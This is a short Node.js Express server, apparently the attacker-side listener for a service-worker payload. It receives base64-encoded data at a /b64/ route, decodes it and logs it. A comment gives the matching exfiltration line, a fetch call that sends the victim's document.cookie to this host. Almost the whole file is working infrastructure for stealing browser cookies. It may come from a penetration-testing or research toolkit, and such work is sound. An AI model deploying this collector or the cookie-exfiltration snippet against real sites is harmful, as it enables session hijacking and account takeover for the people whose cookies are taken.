const express = require("express");
const app = express();
const port = process.argv[2] || 8080;
const Base64 = require("js-base64").Base64;
const cors = require('cors');

/*
 * This server is for catching requests sent by the service worker payload.  See package-sw-payload.sh for instructions
 */

app.use(cors());

/*
 * Log base64 from url
 * fetch('http://host:8080/b64/' + btoa(document.cookie));
 */
app.all("/b64/*", (req, res) => {
  let b64 = /\/b64\/([a-zA-Z0-9+=]+)/.exec(req.url);
  let contents = "";
  if (b64 != null) {
    contents = Base64.decode(b64[1]);
  } else {
    return res.sendStatus(400);
  }
  console.log(contents);
  res.sendStatus(200);
});

app.listen(port, () => console.log(`listening on port ${port}!`));